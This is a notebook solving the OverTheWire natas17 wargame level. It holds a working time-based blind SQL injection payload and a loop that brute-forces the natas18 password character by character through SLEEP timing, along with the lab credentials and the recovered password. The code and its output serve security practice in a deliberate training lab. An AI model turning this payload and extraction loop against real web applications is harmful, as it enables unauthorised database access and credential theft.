# %%
sql = f"natas18\" and BINARY password like \"A%\" AND SLEEP(1)=0 #"
url = f"http://natas17.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(sql)}&debug=0"
result = requests.get(url, auth=("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")).text
print(len(result))
print(result)
# Out:
# 1005
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas17", "pass": "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd" };</script></head>
# <body>
# <h1>natas17</h1>
# <div id="content">
# ...

# %%
import urllib.parse
import requests
from IPython.display import clear_output
import time

def try_inject(sql):
    print(sql)
    t1 = time.time()
    url = f"http://natas17.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(sql)}&debug=0"
    result = requests.get(url, auth=("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")).text
    t2 = time.time() - t1
    print(t2)
    if t2 > 3:
        return True
    else:
        return False

sql = "natas18\" and BINARY password like \"{0}{1}%\" AND SLEEP(3)=0 #"
password = "8NEDUUxg8kFgPV84uLwvZkGn6okJQ"

while True:
    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
        print(f"trying {password}{c}")
        if try_inject(sql.format(password, c)):
            clear_output()
            password += c
            print("-" * 50)
            print(f"current password: {password}")
            print("-" * 50) 
            break
    else:
        break

print("-" * 50)
print(f"password found: {password}")
print("-" * 50)
# Out:
# --------------------------------------------------
# current password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
# --------------------------------------------------
# trying 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aqa
# natas18" and BINARY password like "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aqa%" AND SLEEP(3)=0 #
# 0.5709974765777588
# trying 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aqb
# natas18" and BINARY password like "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aqb%" AND SLEEP(3)=0 #
# 0.5815010070800781
# trying 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aqc
# natas18" and BINARY password like "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aqc%" AND SLEEP(3)=0 #
# 0.5564992427825928
# trying 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aqd
# natas18" and BINARY password like "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aqd%" AND SLEEP(3)=0 #
# 0.5720007419586182
# trying 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aqe
# natas18" and BINARY password like "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aqe%" AND SLEEP(3)=0 #
# 0.5884988307952881
# trying 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aqf
# ...

# %%
url = "http://natas18.natas.labs.overthewire.org/"
result = requests.get(url, auth=("natas18", "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq")).text
print(result)
# Out:
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas18", "pass": "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq" };</script></head>
# <body>
# <h1>natas18</h1>
# <div id="content">
#
# <p>
# Please login with your admin account to retrieve credentials for natas19.
# </p>
#
# <form action="index.php" method="POST">
# Username: <input name="username"><br>
# ...
